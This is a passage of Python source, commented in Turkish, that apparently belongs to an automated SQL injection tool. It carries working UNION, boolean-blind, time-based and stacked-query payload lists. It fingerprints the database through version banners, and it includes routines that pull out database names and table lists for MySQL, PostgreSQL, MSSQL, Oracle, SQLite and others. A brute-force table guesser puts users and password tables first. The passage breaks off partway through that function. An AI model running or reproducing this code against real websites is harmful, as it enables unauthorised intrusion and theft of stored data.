                        icerik = getattr(yanit, 'text', '')
                        if ISARETCI in icerik:
                            self._log_payload_sonuc(payload, True, f"kolon#{i}")
                            sonuc.update({
                                "basarili": True,
                                "kolon_sayisi": kolon_sayisi,
                                "metin_kolonu": i,
                                "prefix": prefix,
                                "yorum": yorum})
                            self.metin_kolonu  = i
                            self._union_prefix = prefix
                            self._union_yorum  = yorum
                            # UNION üzerinden doğrudan version() bandı çekmek, hata mesajı
                            # deseninden DBMS tahmin etmekten çok daha güvenilirdir (hata
                            # mesajları başka bir DBMS'i taklit edebilir) — bu yüzden daha
                            # önce bir tahmin yapılmış olsa bile burada her zaman doğrulanır.
                            self._dbms_tahmin_et(url, param, prefix, kolon_sayisi,
                                                 i, yorum, post_data)
                            self._acik_dogrulandi = True
                            return sonuc
                    except Exception:
                        continue

        return sonuc

    def _dbms_tahmin_et(self, url, param, prefix, n, i, yorum="-- -", post_data=None):
        """
        UNION üzerinden gerçek version() bandı çekerek DBMS'i doğrudan tespit eder.
        Bu yöntem, hata mesajı desenlerinden DBMS tahmin etmekten daha güvenilirdir
        (bazı uygulamalar farklı bir DBMS'i taklit eden jenerik hata mesajları döndürebilir).
        Önceden (örn. hata tabanlı testte) farklı bir DBMS tahmin edilmiş olsa bile,
        burada elde edilen doğrudan kanıt önceliklidir.
        """
        onceki_tahmin = self.tespit_dbms
        isaretci = "VLX_DBMS_"
        testler = [
            ("SQLite",               f"'{isaretci}'||(SELECT sqlite_version())||'{isaretci}'"),
            ("PostgreSQL",           f"'{isaretci}'||(SELECT version())||'{isaretci}'"),
            ("MySQL",                f"CONCAT('{isaretci}',(SELECT version()),'{isaretci}')"),
            ("MariaDB",              f"CONCAT('{isaretci}',(SELECT version()),'{isaretci}')"),
            ("Microsoft SQL Server", f"'{isaretci}'+CAST(@@version AS VARCHAR(200))+'{isaretci}'"),
            ("Oracle",               f"'{isaretci}'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'{isaretci}'"),
        ]
        toplam = len(testler)
        self.log(f"[DBMS] {toplam} DBMS bandı doğrudan UNION ile doğrulanıyor...")
        for idx, (dbms, kolon_ifade) in enumerate(testler, 1):
            kl = ['NULL'] * n
            kl[i] = kolon_ifade
            payload = f"{prefix} UNION SELECT {','.join(kl)}{yorum}"
            self._log_payload_gonder(payload, idx, toplam)
            try:
                yanit = self._istek_at(url, param, payload, post_data=post_data)
                if not yanit:
                    self._log_payload_sonuc(payload, False, "yanıt yok")
                    continue
                icerik = getattr(yanit, 'text', '')
                m = re.search(re.escape(isaretci) + r'(.*?)' + re.escape(isaretci),
                              icerik, re.DOTALL)
                if m and m.group(1).strip():
                    banner = m.group(1).strip()
                    # ── Yanlış eşleşme filtresi ──────────────────────────────
                    # Sorun: Sunucu SQL hata mesajında sorguyu yansıtıyorsa
                    # marker'lar hata metninde görünür ve regex yanlış eşleşir.
                    # Örn: MySQL "sqlite_version() function not found" hatası
                    # içinde payload metninin tamamı yansır; bu durumda yakalanan
                    # değer SQL kod parçası olur, gerçek sürüm bandı değil.
                    # Kural: gerçek sürüm bandı SQL sözdizimi içermez.
                    _SQL_YANSIMA = re.compile(
                        r"sqlite_version\(\)|pg_sleep|CONCAT\(|CAST\(|@@version"
                        r"|\|\|\(|SELECT\s+sqlite|banner\s+FROM|v\$version"
                        r"|RECEIVE_MESSAGE|DBMS_PIPE|\(\s*SELECT\s+version",
                        re.IGNORECASE
                    )
                    if _SQL_YANSIMA.search(banner):
                        self._log_payload_sonuc(payload, False,
                                                "yanlış eşleşme: SQL yansıması reddedildi")
                        continue
                    # Gerçek sürüm bandı: en az 2 karakter, çok uzun değil
                    if len(banner) < 2 or len(banner) > 200:
                        self._log_payload_sonuc(payload, False, "geçersiz banner uzunluğu")
                        continue
                    banner_kisa = banner[:60]
                    self._log_payload_sonuc(payload, True, f"{dbms}: {banner_kisa}")
                    if onceki_tahmin and onceki_tahmin != dbms:
                        self.log(f"[DBMS] ✔ Doğrudan kanıtla düzeltildi: "
                                 f"'{onceki_tahmin}' → '{dbms}' | banner: {banner_kisa}")
                    self.tespit_dbms = dbms
                    return
                else:
                    self._log_payload_sonuc(payload, False)
            except Exception:
                continue
        # Doğrudan kanıt bulunamadı — önceki tahmin varsa onu koru, yoksa MySQL varsayımına düş
        if onceki_tahmin:
            self.log(f"[DBMS] Doğrudan kanıt bulunamadı — önceki tahmin korunuyor: {onceki_tahmin}")
        else:
            self.tespit_dbms = "MySQL"
            self.log("[DBMS] Doğrudan kanıt bulunamadı — varsayılan olarak MySQL kabul ediliyor")

    def _concat_stiller(self, isaretci, sorgu):
        d = self.tespit_dbms or ""
        if d in ("SQLite", "PostgreSQL", "Oracle", "Firebird"):
            return [
                f"'{isaretci}'||({sorgu})||'{isaretci}'",
                f"CONCAT('{isaretci}',({sorgu}),'{isaretci}')",
            ]
        elif d in ("Microsoft SQL Server", "Sybase"):
            return [
                f"'{isaretci}'+CAST(({sorgu}) AS NVARCHAR(MAX))+'{isaretci}'",
                f"'{isaretci}'||({sorgu})||'{isaretci}'",
            ]
        else:
            return [
                f"CONCAT('{isaretci}',({sorgu}),'{isaretci}')",
                f"'{isaretci}'||({sorgu})||'{isaretci}'",
                f"'{isaretci}'+({sorgu})+'{isaretci}'",
            ]

    def union_sorgu_calistir(self, url, param, sorgu, post_data=None):
        if self.kolon_sayisi is None or self.metin_kolonu is None:
            # BUG FIX: stop re-running the full ORDER BY/UNION-NULL column
            # scan on every call once we already know UNION isn't exploitable
            # here — see _union_basarisiz comment in __init__.
            if self._union_basarisiz:
                return None
            u = self.union_tabanli_test(url, param, post_data=post_data)
            if not u.get("basarili"):
                self._union_basarisiz = True
                return None

        n, i   = self.kolon_sayisi, self.metin_kolonu
        prefix = self._union_prefix
        yorum  = getattr(self, '_union_yorum', '-- -')
        isaretci = "VLX" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

        concat_stiller = self._concat_stiller(isaretci, sorgu)

        # ── Hızlı yol: daha önce çalışan kombinasyon önbellekte mi? ──────────
        # İlk başarılı çağrıdan sonra prefix/yorum/concat_tpl kaydedilir.
        # Sonraki her çağrı doğrudan önbelleği dener — 60+ tekrar yok.
        if self._union_concat_cache:
            c = self._union_concat_cache
            c_pfx   = c["prefix"]
            c_ym    = c["yorum"]
            c_tpl   = c["concat_tpl"]   # "{ISARETCI}...{SORGU}...{ISARETCI}" şablonu
            # Şablonu güncel isaretci ve sorgu ile doldur
            try:
                c_ifade = c_tpl.format(ISARETCI=isaretci, SORGU=sorgu)
            except Exception:
                c_ifade = None
            if c_ifade:
                kl_c = ['NULL'] * n
                kl_c[i] = c_ifade
                payload_c = f"{c_pfx} UNION SELECT {','.join(kl_c)}{c_ym}"
                self._log_payload_gonder(payload_c)
                try:
                    yanit_c = self._istek_at(url, param, payload_c, post_data=post_data)
                    if yanit_c:
                        icerik_c = getattr(yanit_c, 'text', '')
                        m_c = re.search(re.escape(isaretci) + r'(.*?)' + re.escape(isaretci),
                                        icerik_c, re.DOTALL)
                        if m_c and m_c.group(1).strip():
                            val_c = m_c.group(1).strip()
                            _SQL_YAPI_C = re.compile(
                                r"SELECT\s+\w|FROM\s+\w|WHERE\s+\w|\|\|\s*\(|GROUP_CONCAT\s*\("
                                r"|CONCAT\s*\(|SUBSTRING\s*\(|sqlite_version\s*\(|pragma_table_info"
                                r"|pg_catalog\.|sys\.tables|v\$version", re.IGNORECASE)
                            if not _SQL_YAPI_C.search(val_c):
                                try:
                                    import urllib.parse as _up2
                                    dec = val_c
                                    for _ in range(2):
                                        _n2 = _up2.unquote_plus(dec)
                                        if _n2 == dec:
                                            break
                                        dec = _n2
                                    val_c = dec
                                except Exception:
                                    pass
                                self._log_payload_sonuc(payload_c, True, val_c[:40])
                                return val_c
                except Exception:
                    pass
                # Önbellek işe yaramadı — tam tarama yap ama önbelleği temizle
                self.log("[UNION] Önbellek uyuşmadı — tam tarama yapılıyor...")
                self._union_concat_cache = None

        for pfx in [prefix] + [p for p in ["-1", "0", "' AND 1=2", "1 AND 1=2", "-1'"]
                                if p != prefix]:
            for ym in [yorum] + [y for y in ["-- -", "#", "-- ", "/**/-- -"]
                                  if y != yorum]:
                for concat_ifade in concat_stiller:
                    kl = ['NULL'] * n
                    kl[i] = concat_ifade
                    payload = f"{pfx} UNION SELECT {','.join(kl)}{ym}"
                    self._log_payload_gonder(payload)
                    try:
                        yanit = self._istek_at(url, param, payload, post_data=post_data)
                        if not yanit:
                            continue
                        icerik = getattr(yanit, 'text', '')
                        m = re.search(re.escape(isaretci) + r'(.*?)' + re.escape(isaretci),
                                      icerik, re.DOTALL)
                        if m:
                            val = m.group(1).strip()
                            if val:
                                # BUG FIX: sunucu yanıtta URL-encoded (hatta double/triple-encoded)
                                # SQL payload yansıtıyor olabilir. Örn: %2527%257C%257C%2528SELECT...
                                # Önce progressive URL-decode yaparak gerçek içeriği ortaya çıkar,
                                # sonra SQL keyword kontrolü yap. Decode edilmiş değeri döndür.
                                try:
                                    import urllib.parse as _up
                                    decoded = val
                                    for _ in range(2):
                                        _new = _up.unquote_plus(decoded)
                                        if _new == decoded:
                                            break
                                        decoded = _new
                                except Exception:
                                    decoded = val
                                # SQL YAPISALI yansıma tespiti — tekil anahtar kelime değil,
                                # SQL sorgu yapısını ara. Örn:
                                #   Gerçek veri: "information_schema,mysql,istituti_db" → GEÇ
                                #   Yansıma: "' || (SELECT version()) || '" → REDDET
                                # Kural: içinde SQL clause yapısı (SELECT+FROM, function call
                                # parantezi, operator+SELECT) varsa yansıma olarak say.
                                _SQL_YAPI = re.compile(
                                    r"SELECT\s+\w|FROM\s+\w|WHERE\s+\w"   # SQL clause
                                    r"|\|\|\s*\("                           # ||( operator
                                    r"|GROUP_CONCAT\s*\("                   # GROUP_CONCAT(
                                    r"|CONCAT\s*\("                         # CONCAT(
                                    r"|SUBSTRING\s*\("                      # SUBSTRING(
                                    r"|sqlite_version\s*\("                 # sqlite_version()
                                    r"|pragma_table_info"                   # SQLite pragma
                                    r"|pg_catalog\."                        # PostgreSQL catalog
                                    r"|sys\.tables"                         # MSSQL sys tables
                                    r"|v\$version",                         # Oracle v$version
                                    re.IGNORECASE
                                )
                                if _SQL_YAPI.search(decoded):
                                    continue
                                # Gerçek veri: decode edilmiş halini kullan
                                val = decoded
                                # Sniper: HTML etiket içeren değerleri reddet
                                # (marker bir HTML attribute/JS bloğuna yansıtılmışsa
                                # gerçek DB verisi gibi görünür ama aslında gürültüdür)
                                rv = self._dogrulayici()
                                if rv and not rv.union_veri_temiz_mi(val):
                                    self._log_payload_sonuc(payload, False, "Sniper: HTML/gürültü reddedildi")
                                    continue
                                if not self.tespit_dbms:
                                    if '||' in concat_ifade:
                                        self.tespit_dbms = "SQLite"
                                    elif 'CONCAT' in concat_ifade:
                                        self.tespit_dbms = "MySQL"
                                # ── Başarılı kombinasyonu önbelleğe al ───────
                                # Şablondan {ISARETCI} ve {SORGU} yer tutucuları
                                # çıkararak tekrar kullanılabilir bir şablon oluştur.
                                try:
                                    tpl = (concat_ifade
                                           .replace(isaretci, "{ISARETCI}")
                                           .replace(sorgu,    "{SORGU}"))
                                    if "{ISARETCI}" in tpl and "{SORGU}" in tpl:
                                        self._union_concat_cache = {
                                            "prefix":     pfx,
                                            "yorum":      ym,
                                            "concat_tpl": tpl,
                                        }
                                except Exception:
                                    pass
                                self._log_payload_sonuc(payload, True, val[:40])
                                return val
                    except Exception:
                        pass
        return None

    # ── 3. BOOLEAN BLIND ─────────────────────────────────────────────────────
    def boolean_blind_test(self, url, param, post_data=None):
        sonuc = {"basarili": False, "payload": None}
        try:
            temel = self._istek_at(url, param, "1", post_data=post_data)
            if not temel:
                return sonuc
            temel_uzunluk = len(getattr(temel, 'text', ''))
        except Exception:
            return sonuc

        try:
            from zeka_sistemi.pyload_havuzu.sqlmap_payloads import BOOLEAN_CIFTLE
            ciftle = BOOLEAN_CIFTLE
        except ImportError:
            ciftle = [
                ("1 AND 1=1-- -",     "1 AND 1=2-- -"),
                ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
                ("1 AND TRUE-- -",    "1 AND FALSE-- -"),
                ("1 AND 1=1#",        "1 AND 1=2#"),
                ("1) AND (1=1-- -",   "1) AND (1=2-- -"),
                ("1' AND 1=1-- -",    "1' AND 1=2-- -"),
                ("1 OR 1=1-- -",      "1 OR 1=2-- -"),
                ("1 AND 2>1-- -",     "1 AND 2<1-- -"),
            ]

        toplam = len(ciftle)
        for i, (dogru, yanlis) in enumerate(ciftle, 1):
            self._log_payload_gonder(dogru, i, toplam)
            try:
                d = self._istek_at(url, param, dogru, post_data=post_data)
                y = self._istek_at(url, param, yanlis, post_data=post_data)
                if not d or not y:
                    continue
                d_len = len(getattr(d, 'text', ''))
                y_len = len(getattr(y, 'text', ''))
                # 3'lü karşılaştırma: TRUE yanıtı referansa (normal sayfa) yakın
                # olmalı, FALSE yanıtı ise hem referanstan hem TRUE'dan anlamlı
                # şekilde farklı olmalı — yalnızca d/y farkına bakmak dinamik
                # içerikli sayfalarda kolay yanlış-pozitif üretir.
                d_ref_fark = abs(d_len - temel_uzunluk)
                y_ref_fark = abs(y_len - temel_uzunluk)
                d_y_fark = abs(d_len - y_len)
                referans_toleransi = max(5, int(temel_uzunluk * 0.02))
                if (d_ref_fark <= referans_toleransi
                        and y_ref_fark > referans_toleransi
                        and d_y_fark > 5):
                    self._log_payload_sonuc(
                        dogru, True,
                        f"ref={temel_uzunluk} doğru={d_len} yanlış={y_len}")
                    sonuc.update({"basarili": True, "payload": dogru})
                    self._acik_dogrulandi = True
                    return sonuc
                else:
                    self._log_payload_sonuc(dogru, False, f"len={d_len}")
            except Exception:
                continue
        return sonuc

    # ── 4. TIME-BASED BLIND ───────────────────────────────────────────────────
    def time_based_test(self, url, param, gecikme=5, post_data=None):
        sonuc = {"basarili": False, "payload": None, "gecikme": None}

        payloadlar = [
            f"1 AND SLEEP({gecikme})-- -",
            f"' AND SLEEP({gecikme})-- -",
            f"1) AND SLEEP({gecikme})-- -",
            f"1 AND (SELECT SLEEP({gecikme}))-- -",
            f"'; WAITFOR DELAY '0:0:{gecikme}'--",
            f"1; WAITFOR DELAY '0:0:{gecikme}'--",
            f"1; IF (1=1) WAITFOR DELAY '0:0:3'-- -",
            f"1; IF (SELECT COUNT(*) FROM information_schema.tables)>0 WAITFOR DELAY '0:0:3'-- -",
            f"'; SELECT SLEEP({gecikme})--",
            f"1' AND SLEEP({gecikme})-- -",
            f"1 OR SLEEP({gecikme})-- -",
            # PostgreSQL
            f"1; SELECT pg_sleep({gecikme})-- -",
            f"'; SELECT pg_sleep({gecikme})-- -",
            f"1) AND (SELECT pg_sleep({gecikme}))-- -",
            # Oracle
            f"1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{gecikme})-- -",
            # Benchmark
            f"1 AND BENCHMARK({gecikme}000000,MD5(1))-- -",
            f"' AND BENCHMARK({gecikme}000000,MD5('a'))-- -",
        ]

        # Baseline (gecikmesiz) istek — ağ/sunucu gecikmesini hesaba katmak için.
        # Bu olmadan doğal olarak yavaş bir hedef, gerçek SQLi olmadan da
        # eşiği aşıp yanlış-pozitif üretebilir.
        temel_sure = self._temel_gecikme_olc(url, param, post_data)
        esik = max(gecikme * 0.8, temel_sure + gecikme * 0.6)

        toplam = len(payloadlar)
        for i, p in enumerate(payloadlar, 1):
            self._log_payload_gonder(p, i, toplam)
            try:
                bas = time.time()
                yanit = self._istek_at(url, param, p, post_data=post_data,
                                       timeout=gecikme + 10)
                sure = time.time() - bas
                if sure >= esik:
                    # Tek ölçüm yanlış-pozitif riski taşır — aynı payload'ı
                    # bir kez daha gönderip gecikmeyi doğrula.
                    bas2 = time.time()
                    self._istek_at(url, param, p, post_data=post_data,
                                    timeout=gecikme + 10)
                    sure2 = time.time() - bas2
                    if sure2 >= esik:
                        self._log_payload_sonuc(
                            p, True, f"süre={sure:.1f}s/{sure2:.1f}s taban={temel_sure:.1f}s")
                        sonuc.update({"basarili": True, "payload": p, "gecikme": sure})
                        self._acik_dogrulandi = True
                        return sonuc
                    else:
                        self._log_payload_sonuc(p, False, f"doğrulanamadı süre2={sure2:.1f}s")
                else:
                    self._log_payload_sonuc(p, False, f"süre={sure:.1f}s taban={temel_sure:.1f}s")
            except Exception:
                continue
        return sonuc

    def _temel_gecikme_olc(self, url, param, post_data=None, deneme=3):
        """Gecikmesiz referans isteklerin medyan süresini ölç (time-based/stacked
        tespitinde ağ/sunucu gecikmesini eşikten ayırmak için kullanılır)."""
        sureler = []
        for _ in range(deneme):
            try:
                bas = time.time()
                self._istek_at(url, param, "1", post_data=post_data, timeout=15)
                sureler.append(time.time() - bas)
            except Exception:
                continue
        if not sureler:
            return 0.0
        sureler.sort()
        return sureler[len(sureler) // 2]

    # ── 5. STACKED QUERIES ────────────────────────────────────────────────────
    def stacked_test(self, url, param, post_data=None):
        sonuc = {"basarili": False, "payload": None}
        gecikme = 3
        payloadlar = [
            f"1; WAITFOR DELAY '0:0:{gecikme}'-- -",
            f"'; WAITFOR DELAY '0:0:{gecikme}'-- -",
            f"1; SELECT SLEEP({gecikme})-- -",
            f"'; SELECT SLEEP({gecikme})-- -",
            f"1; SELECT pg_sleep({gecikme})-- -",
        ]
        # Baseline ölçümü + iki aşamalı doğrulama: time_based_test ile aynı
        # mantık — tek istek gecikmesi ağ/sunucu kaynaklı olabilir.
        temel_sure = self._temel_gecikme_olc(url, param, post_data)
        esik = max(gecikme * 0.8, temel_sure + gecikme * 0.6)

        toplam = len(payloadlar)
        for i, p in enumerate(payloadlar, 1):
            self._log_payload_gonder(p, i, toplam)
            try:
                bas = time.time()
                self._istek_at(url, param, p, post_data=post_data, timeout=gecikme + 8)
                sure = time.time() - bas
                if sure >= esik:
                    bas2 = time.time()
                    self._istek_at(url, param, p, post_data=post_data, timeout=gecikme + 8)
                    sure2 = time.time() - bas2
                    if sure2 >= esik:
                        self._log_payload_sonuc(p, True, f"süre={sure:.1f}s/{sure2:.1f}s taban={temel_sure:.1f}s")
                        sonuc.update({"basarili": True, "payload": p})
                        return sonuc
                    else:
                        self._log_payload_sonuc(p, False, f"doğrulanamadı süre2={sure2:.1f}s")
                else:
                    self._log_payload_sonuc(p, False, f"süre={sure:.1f}s taban={temel_sure:.1f}s")
            except Exception:
                pass
        return sonuc

    # ── 6. AÇIK DOĞRULAMA (5-6 farklı yöntem) ───────────────────────────────
    def acik_dogrula(self, url, param, teknik: str, payload: str,
                     post_data=None, deney_sayisi: int = 6) -> Dict:
        """
        Bulunan açığı 5-6 farklı yöntemle doğrular.
        Farklı parametreler ve türevlerle sınar, çoğunluk kararı verir.
        """
        self.log(f"[DOĞRULAMA] '{teknik}' açığı {deney_sayisi} kez doğrulanıyor...")
        basarili = 0
        detaylar = []

        for i in range(1, deney_sayisi + 1):
            try:
                if teknik == "ERROR":
                    yanit = self._istek_at(url, param, payload, post_data=post_data)
                    icerik = getattr(yanit, 'text', '') if yanit else ''
                    bulunan, _ = HataDeseniTespiti.tespit_et(icerik)
                    if bulunan:
                        basarili += 1
                        detaylar.append(f"Deneme {i}: ✔ HATA TESPİT")
                        self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✔ Hata deseni doğrulandı")
                    else:
                        detaylar.append(f"Deneme {i}: ✗ hata yok")
                        self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✗ Hata deseni bulunamadı")

                elif teknik == "UNION":
                    # Her seferinde farklı marker ile test et
                    marker = "VLX_VERIFY_" + str(i)
                    sonuc = self.union_sorgu_calistir(url, param, f"SELECT '{marker}'",
                                                     post_data=post_data)
                    if sonuc and marker in str(sonuc):
                        basarili += 1
                        detaylar.append(f"Deneme {i}: ✔ UNION döndü={sonuc[:20]}")
                        self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✔ UNION doğrulandı → {sonuc[:30]}")
                    else:
                        # Alternatif: version() sorgula
                        ver = self.union_sorgu_calistir(url, param, "SELECT version()", post_data=post_data)
                        if ver:
                            basarili += 1
                            detaylar.append(f"Deneme {i}: ✔ version={ver[:20]}")
                            self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✔ version()={ver[:30]}")
                        else:
                            detaylar.append(f"Deneme {i}: ✗")
                            self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✗")

                elif teknik == "BOOLEAN":
                    d = self._istek_at(url, param, "1 AND 1=1-- -", post_data=post_data)
                    y = self._istek_at(url, param, "1 AND 1=2-- -", post_data=post_data)
                    if d and y:
                        dl = len(getattr(d, 'text', ''))
                        yl = len(getattr(y, 'text', ''))
                        if abs(dl - yl) > 5:
                            basarili += 1
                            detaylar.append(f"Deneme {i}: ✔ Δ={abs(dl-yl)}")
                            self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✔ Boolean Δlen={abs(dl-yl)}")
                        else:
                            detaylar.append(f"Deneme {i}: ✗ aynı uzunluk")
                            self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✗")
                    else:
                        detaylar.append(f"Deneme {i}: ✗ yanıt yok")

                elif teknik in ("TIME", "STACKED"):
                    gc = 3
                    bas = time.time()
                    self._istek_at(url, param, payload, post_data=post_data, timeout=gc+8)
                    sure = time.time() - bas
                    if sure >= gc * 0.8:
                        basarili += 1
                        detaylar.append(f"Deneme {i}: ✔ {sure:.1f}s")
                        self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✔ gecikme={sure:.1f}s")
                    else:
                        detaylar.append(f"Deneme {i}: ✗ {sure:.1f}s")
                        self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] ✗ gecikme={sure:.1f}s")

            except Exception as e:
                detaylar.append(f"Deneme {i}: hata={str(e)[:25]}")
                self.log(f"  [DOĞRULAMA {i}/{deney_sayisi}] istisna: {str(e)[:40]}")

        oran = basarili / deney_sayisi
        onaylandi = oran >= 0.5  # en az %50 başarı

        self.log(f"[DOĞRULAMA] Sonuç: {basarili}/{deney_sayisi} → {'✔ ONAYLANDI' if onaylandi else '✗ REDDEDİLDİ'}")
        return {
            "onaylandi": onaylandi,
            "basarili_sayi": basarili,
            "toplam": deney_sayisi,
            "oran": oran,
            "detaylar": detaylar,
        }

    # ── DB SORGULARI ──────────────────────────────────────────────────────────
    def mevcut_veritabani_al(self, url, param, post_data=None):
        sorgular = {
            "MySQL":                 "SELECT database()",
            "MariaDB":               "SELECT database()",
            "PostgreSQL":            "SELECT current_database()",
            "Microsoft SQL Server":  "SELECT DB_NAME()",
            "Oracle":                "SELECT ora_database_name FROM dual",
            "SQLite":                "SELECT 'main'",
            "IBM DB2":               "SELECT current server FROM sysibm.sysdummy1",
        }
        dbms = self.tespit_dbms or "MySQL"
        sorgu = sorgular.get(dbms, "SELECT database()")

        sonuc = self.union_sorgu_calistir(url, param, sorgu, post_data=post_data)
        if not sonuc:
            sonuc = self.hata_sorgu_calistir(url, param, sorgu, post_data=post_data)
        # Boolean blind fallback — UNION ve error-based başarısız olursa
        if not sonuc:
            self.log("[SQL] DB adı: boolean blind ile deneniyor...")
            sonuc = self.boolean_veri_cek(url, param, sorgu,
                                          post_data=post_data, max_uzunluk=64)
        # Time-based blind son çare
        if not sonuc:
            self.log("[SQL] DB adı: time-based blind ile deneniyor...")
            sonuc = self.time_veri_cek(url, param, sorgu,
                                        post_data=post_data, max_uzunluk=64)
        return sonuc

    mevcut_db_al = mevcut_veritabani_al

    def tablolari_al(self, url, param, hedef_db, post_data=None):
        """Tabloları önce information_schema'dan al, bulamazsa brute force ile dene"""
        self.log(f"[SQL] Tablolar sorgulanıyor (db={hedef_db})...")
        dbms = self.tespit_dbms or "MySQL"

        sorgular = []
        if dbms in ("MySQL", "MariaDB"):
            sorgular = [
                f"SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='{hedef_db}'",
                f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()",
                f"SELECT table_name FROM information_schema.tables WHERE table_schema='{hedef_db}' LIMIT 1",
            ]
        elif dbms == "PostgreSQL":
            sorgular = [
                "SELECT string_agg(tablename,',') FROM pg_catalog.pg_tables WHERE schemaname='public'",
                "SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public' LIMIT 1",
            ]
        elif dbms == "Microsoft SQL Server":
            sorgular = [
                "SELECT STRING_AGG(table_name,',') FROM information_schema.tables",
                "SELECT TOP 1 table_name FROM information_schema.tables",
            ]
        elif dbms == "Oracle":
            sorgular = [
                "SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables",
                "SELECT table_name FROM user_tables WHERE ROWNUM=1",
            ]
        elif dbms == "SQLite":
            sorgular = [
                "SELECT group_concat(name,',') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
                "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1",
            ]
        elif dbms == "IBM DB2":
            sorgular = [
                "SELECT LISTAGG(TABNAME, ',') WITHIN GROUP (ORDER BY TABNAME) FROM SYSCAT.TABLES WHERE TABSCHEMA=CURRENT_SCHEMA",
                "SELECT TABNAME FROM SYSCAT.TABLES WHERE TABSCHEMA=CURRENT_SCHEMA FETCH FIRST 1 ROWS ONLY",
            ]
        elif dbms in ("Firebird", "InterBase"):
            sorgular = [
                r"SELECT LIST(DISTINCT RDB$RELATION_NAME, ',') FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG=0",
                r"SELECT FIRST 1 RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG=0",
            ]
        elif dbms in ("CockroachDB",):
            sorgular = [
                "SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
            ]
        elif dbms == "ClickHouse":
            sorgular = [
                "SELECT groupArray(name) FROM system.tables WHERE database=currentDatabase()",
                "SELECT name FROM system.tables WHERE database=currentDatabase() LIMIT 1",
            ]
        else:
            sorgular = [
                f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{hedef_db}'",
            ]

        tablolar = []
        for sorgu in sorgular:
            sonuc = self.union_sorgu_calistir(url, param, sorgu, post_data=post_data)
            if not sonuc:
                sonuc = self.hata_sorgu_calistir(url, param, sorgu, post_data=post_data)
            if sonuc and isinstance(sonuc, str) and len(sonuc) > 1:
                # Birden fazla tablo gelmiş olabilir (GROUP_CONCAT)
                if ',' in sonuc:
                    tablolar = [t.strip() for t in sonuc.split(',') if t.strip()]
                else:
                    tablolar = [sonuc.strip()]
                if tablolar:
                    self.log(f"[SQL] {len(tablolar)} tablo bulundu: {tablolar[:5]}...")
                    return tablolar

        # Boolean blind ile tablo listesi dene (GROUP_CONCAT sonucu char-by-char çeker)
        if not tablolar:
            self.log("[SQL] UNION/Error başarısız — boolean blind ile tablo listesi deneniyor...")
            for sorgu in sorgular[:1]:  # En kapsamlı sorguyu dene
                sonuc = self.boolean_veri_cek(url, param, sorgu,
                                              post_data=post_data, max_uzunluk=512)
                if sonuc and len(sonuc) > 1:
                    if ',' in sonuc:
                        tablolar = [t.strip() for t in sonuc.split(',') if t.strip()]
                    else:
                        tablolar = [sonuc.strip()]
                    if tablolar:
                        self.log(f"[SQL] Boolean blind ile {len(tablolar)} tablo bulundu.")
                        break

        # Time-based blind son çare olarak dene (çok yavaş)
        if not tablolar:
            self.log("[SQL] Boolean blind başarısız — time-based blind deneniyor...")
            sorgu = sorgular[0] if sorgular else (
                f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
                f"WHERE table_schema='{hedef_db}'")
            sonuc = self.time_veri_cek(url, param, sorgu,
                                        post_data=post_data, max_uzunluk=256)
            if sonuc and len(sonuc) > 1:
                if ',' in sonuc:
                    tablolar = [t.strip() for t in sonuc.split(',') if t.strip()]
                else:
                    tablolar = [sonuc.strip()]
                if tablolar:
                    self.log(f"[SQL] Time-based blind ile {len(tablolar)} tablo bulundu.")

        # Son çare: brute force — sadece injection açığı kesin olarak doğrulandıysa çalıştır
        if not tablolar and self._acik_dogrulandi:
            self.log("[SQL] Tüm teknikler başarısız — brute force tablo bulucu devreye giriyor...")
            tablolar = self._brute_force_tablolar(url, param, post_data=post_data)

        return tablolar

    def _brute_force_tablolar(self, url, param, post_data=None,
                               cms: str = None, limit: int = None):
        """
        Bilinen tablo isimlerini tek tek test eder — SQLmap mantığı.

        v4.1 (Sniper Mode):
          • CMS-aware: cms parametresi verilmişse o CMS'e özel tablo listesi
            öncelikli kullanılır (örn. WordPress → wp_users, wp_options önce)
          • tablo_listesi_al() kritik tabloları (users, passwords, admins) her
            zaman listenin başına koyar — ilk 20 denemede kritik tablolar test edilir
          • limit parametresi ile büyük listeyi kısaltabilirsiniz (Sniper profil
            bağlantısı: zayıf hedef → az deneme)
          • HTTP yanıtını ResponseValidator'dan geçirir — HTML gürültüsü "tablo var"
            olarak yanlış sayılmaz
        """
        # CMS-aware liste
        try:
            from zeka_sistemi.tablo_bulucu import tablo_listesi_al, BRUTE_TABLO_LISTESI
            liste = tablo_listesi_al(cms=cms, limit=limit, kritik_once=True)
        except ImportError:
            from zeka_sistemi.tablo_bulucu import BRUTE_TABLO_LISTESI
            liste = BRUTE_TABLO_LISTESI

        bulunan = []
        toplam  = len(liste)
        cms_notu = f" (CMS={cms})" if cms else ""
        self.log(f"[BRUTE] {toplam} tablo adı test ediliyor{cms_notu}...")

        rv = self._dogrulayici()   # Sniper: HTML filtre

        for idx, tablo in enumerate(liste, 1):
            if idx % 50 == 0:
                self.log(f"[BRUTE] {idx}/{toplam} tablo denendi, {len(bulunan)} bulundu...")
            sorgu = f"SELECT COUNT(*) FROM {tablo}"
            self._log_payload_gonder(sorgu, idx, toplam)
            try:
